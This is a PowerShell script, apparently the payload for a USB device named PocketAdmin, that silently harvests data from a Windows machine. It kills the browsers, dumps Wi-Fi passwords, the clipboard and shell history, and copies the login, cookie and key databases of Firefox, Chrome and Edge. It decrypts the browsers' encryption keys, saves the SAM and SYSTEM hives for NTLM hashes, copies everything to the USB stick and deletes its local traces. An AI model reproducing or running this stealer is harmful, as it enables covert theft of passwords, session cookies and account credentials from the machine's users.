#create a new subdirectory named after current date and time inside current user's TEMP directory
$date = Get-Date -Format yyyyMMdd
$time = Get-Date -Format HHmmss
$saveDir = "${env:LOCALAPPDATA}\Temp\${date}_${time}"
New-Item -ItemType Directory -Path "${saveDir}"

#close chrome and edge browsers to make their Cookies file readable, give them some time to exit completely while other data is collected
Stop-Process -Name chrome
Stop-Process -Name msedge

#gather some system information, lists of active processes, services and scheduled tasks
Get-ComputerInfo | Out-File -Width 512 -FilePath "${saveDir}\computer_info.txt" -Encoding utf8
Get-Process | Format-Table -AutoSize | Out-File -Width 512 -FilePath "${saveDir}\process_list.txt" -Encoding utf8
Get-Service | Format-Table -AutoSize | Out-File -Width 512 -FilePath "${saveDir}\service_list.txt" -Encoding utf8
Get-ScheduledTask | Format-Table -AutoSize -Property @("TaskPath", "TaskName", "State", "Description") | Out-File -Width 512 -FilePath "${saveDir}\scheduled_tasks.txt" -Encoding utf8

#gather information about installed applications
$objects = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object {$_.DisplayName} 
$objects = ($objects | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate)
$text = ($objects | Format-Table -AutoSize | Out-String -Width 512)

$objects = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object {$_.DisplayName} 
$objects = ($objects | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate)
$text = $text + ($objects | Format-Table -AutoSize | Out-String -Width 512)
$text | Out-File -Width 512 -FilePath "${saveDir}\installed_apps.txt" -Encoding utf8

#gather information about available disk volumes and hard drive devices
$text = "List of volumes:" + (Get-Volume | Format-Table -AutoSize | Out-String -Width 512) 
$text = $text + "`nList of hard drives:" + (Get-Disk | Format-Table -AutoSize | Out-String -Width 512)
$text = $text + "`nList of partitions:"  + (Get-Partition | Out-String)
$text | Out-File -Width 512 -FilePath "${saveDir}\harddrive_info.txt" -Encoding utf8

#collect local user and group names with some metadata
$text = "current user name = ${env:USERNAME}" + (Get-WmiObject -Class Win32_UserAccount | Out-String -Width 512) 
$text = $text + (Get-LocalUser | Out-String -Width 512)
$text | Out-File -Width 512 -FilePath "${saveDir}\local_users.txt" -Encoding utf8

$text = (Get-LocalGroup | Out-String -Width 512)
$objects = Get-LocalGroup
foreach ($thing in $objects)
{
$members = Get-LocalGroupMember -Name ${thing}.Name;
$text = $text + "`nMembers of group ${thing}: ${members}"
}
$text | Out-File -Width 512 -FilePath "${saveDir}\local_groups.txt" -Encoding utf8

#collect currently logged in user's powershell history, homedir file structure and clipboard contents
Get-ChildItem "${HOME}" -Recurse | select FullName | Out-File -Width 512 -FilePath "${saveDir}\homedir_structure.txt" -Encoding utf8
Get-Content "${env:APPDATA}\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" | Out-File -Width 512 -FilePath "${saveDir}\powershell_history.txt" -Encoding utf8
Get-Clipboard -Raw | Out-File -Width 512 -FilePath "${saveDir}\clipboard_content.txt" -Encoding utf8

#get current network configuration, hosts file, Wi-Fi passwords
$text = (ipconfig | Out-String -Width 512)
$text = $text + (Get-NetIPAddress | Format-Table -AutoSize -Property @("ifIndex","IPAddress","PrefixLength", "PrefixOrigin", "AddressFamily","InterfaceAlias") | Out-String -Width 512)
$text | Out-File -Width 512 -FilePath "${saveDir}\network_config.txt" -Encoding utf8

Get-Content "C:\Windows\System32\drivers\etc\hosts" | Out-File -Width 512 -FilePath "${saveDir}\hosts_file.txt" -Encoding utf8
netsh wlan show profile name="*" key=clear | Out-File -Width 512 -FilePath "${saveDir}\WiFi_profiles.txt" -Encoding utf8



#define a function to extract AES256-GCM secret key from chrome and edge browsers (only works for data which has encrypted_value starting with v10)
function decrypt_v10_key($source, $output)
{
  #load the necessary .NET assembly
  Add-Type -AssemblyName "System.Security"
  
  #read the Local State file, find value for json field of "encrypted_key", convert it from base64 string to byte array
  $fromJSON = Get-Content -Path "${source}" | ConvertFrom-Json
  $encrypted_key = [System.Convert]::FromBase64String($fromJSON.os_crypt.encrypted_key)
  
  #strip first 5 bytes of $encrypted_key (contains 'DPAPI' prefix), then decrypt bytes using DPAPI and write the decrypted key to the output file
  $encrypted_key = $encrypted_key[5..($encrypted_key.Length - 1)]
  $decrypted_key = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted_key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
  [System.IO.File]::WriteAllBytes("${output}", $decrypted_key)
}

#copy firefox browser files to TEMP directory
New-Item -ItemType Directory -Path "${saveDir}\firefox" 
foreach ($thing in Get-ChildItem -Path "${env:APPDATA}\Mozilla\Firefox\Profiles" -Directory)
{
$ProfileDir = $thing.Name
New-Item -ItemType Directory -Path "${saveDir}\firefox\${ProfileDir}" 
Copy-Item -Path "${env:APPDATA}\Mozilla\Firefox\Profiles\${ProfileDir}\cookies.sqlite" -Destination "${saveDir}\firefox\${ProfileDir}"
Copy-Item -Path "${env:APPDATA}\Mozilla\Firefox\Profiles\${ProfileDir}\webappsstore.sqlite" -Destination "${saveDir}\firefox\${ProfileDir}"
Copy-Item -Path "${env:APPDATA}\Mozilla\Firefox\Profiles\${ProfileDir}\places.sqlite" -Destination "${saveDir}\firefox\${ProfileDir}"
Copy-Item -Path "${env:APPDATA}\Mozilla\Firefox\Profiles\${ProfileDir}\formhistory.sqlite" -Destination "${saveDir}\firefox\${ProfileDir}"
Copy-Item -Path "${env:APPDATA}\Mozilla\Firefox\Profiles\${ProfileDir}\prefs.js" -Destination "${saveDir}\firefox\${ProfileDir}"
Copy-Item -Path "${env:APPDATA}\Mozilla\Firefox\Profiles\${ProfileDir}\key4.db" -Destination "${saveDir}\firefox\${ProfileDir}"
Copy-Item -Path "${env:APPDATA}\Mozilla\Firefox\Profiles\${ProfileDir}\cert9.db" -Destination "${saveDir}\firefox\${ProfileDir}"
Copy-Item -Path "${env:APPDATA}\Mozilla\Firefox\Profiles\${ProfileDir}\logins.json" -Destination "${saveDir}\firefox\${ProfileDir}"
Copy-Item -Path "${env:APPDATA}\Mozilla\Firefox\Profiles\${ProfileDir}\times.json" -Destination "${saveDir}\firefox\${ProfileDir}"
}

#copy chrome browser files to TEMP directory
New-Item -ItemType Directory -Path "${saveDir}\chrome"
Copy-Item -Path "${env:LOCALAPPDATA}\Google\Chrome\User Data\Default\Network\Cookies" -Destination "${saveDir}\chrome\Cookies.sqlite"
Copy-Item -Path "${env:LOCALAPPDATA}\Google\Chrome\User Data\Default\Login Data" -Destination "${saveDir}\chrome\Login Data.sqlite"
Copy-Item -Path "${env:LOCALAPPDATA}\Google\Chrome\User Data\Default\History" -Destination "${saveDir}\chrome\History.sqlite"
Copy-Item -Path "${env:LOCALAPPDATA}\Google\Chrome\User Data\Default\Top Sites" -Destination "${saveDir}\chrome\Top Sites.sqlite"
Copy-Item -Path "${env:LOCALAPPDATA}\Google\Chrome\User Data\Default\Web Data" -Destination "${saveDir}\chrome\Web Data.sqlite"
Copy-Item -Path "${env:LOCALAPPDATA}\Google\Chrome\User Data\Default\Preferences" -Destination "${saveDir}\chrome\Preferences.json"
Copy-Item -Path "${env:LOCALAPPDATA}\Google\Chrome\User Data\Default\Bookmarks" -Destination "${saveDir}\chrome\Bookmarks.json"
Copy-Item -Path "${env:LOCALAPPDATA}\Google\Chrome\User Data\Local State" -Destination "${saveDir}\chrome\Local State.json"
decrypt_v10_key "${saveDir}\chrome\Local State.json" "${saveDir}\chrome\decrypted_key_v10.bin"

#copy edge browser files to TEMP directory (close the browser to make Cookies file readable)
New-Item -ItemType Directory -Path "${saveDir}\edge"
Copy-Item -Path "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\Default\Network\Cookies" -Destination "${saveDir}\edge\Cookies.sqlite"
Copy-Item -Path "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\Default\Login Data" -Destination "${saveDir}\edge\Login Data.sqlite"
Copy-Item -Path "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\Default\History" -Destination "${saveDir}\edge\History.sqlite"
Copy-Item -Path "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\Default\Top Sites" -Destination "${saveDir}\edge\Top Sites.sqlite"
Copy-Item -Path "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\Default\Web Data" -Destination "${saveDir}\edge\Web Data.sqlite"
Copy-Item -Path "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\Default\Preferences" -Destination "${saveDir}\edge\Preferences.json"
Copy-Item -Path "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\Default\Bookmarks" -Destination "${saveDir}\edge\Bookmarks.json"
Copy-Item -Path "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\Local State" -Destination "${saveDir}\edge\Local State.json"
decrypt_v10_key "${saveDir}\edge\Local State.json" "${saveDir}\edge\decrypted_key_v10.bin"

#save SAM and SYSTEM registry hives (to extract NTLM hashes of local user passwords)
New-Item -ItemType Directory -Path "${saveDir}\registry"
reg save HKLM\sam "${savedir}\registry\SAM"
reg save HKLM\system "${savedir}\registry\SYSTEM"

#compress TEMP directory into a zip archive, send it to PocketAamin's USB drive, delete zip file and TEMP directory on local disk
Compress-Archive -Path "${savedir}" -CompressionLevel Optimal -DestinationPath "${savedir}.zip"
$driveletter = (Get-Volume -FileSystemLabel POCKETADMIN).DriveLetter
Copy-Item -Path "${savedir}.zip" -Destination "${driveletter}:\"
Remove-Item -Path "${savedir}" -Force -Recurse
Remove-Item -Path "${savedir}.zip" -Force

#eject the PocketAamin's USB drive automatically (try 2 times to increase reliability)
Start-Sleep -Seconds 1
(New-Object -comObject Shell.Application).NameSpace(17).ParseName("${driveletter}:").InvokeVerb("Eject")
Start-Sleep -Seconds 1
(New-Object -comObject Shell.Application).NameSpace(17).ParseName("${driveletter}:").InvokeVerb("Eject")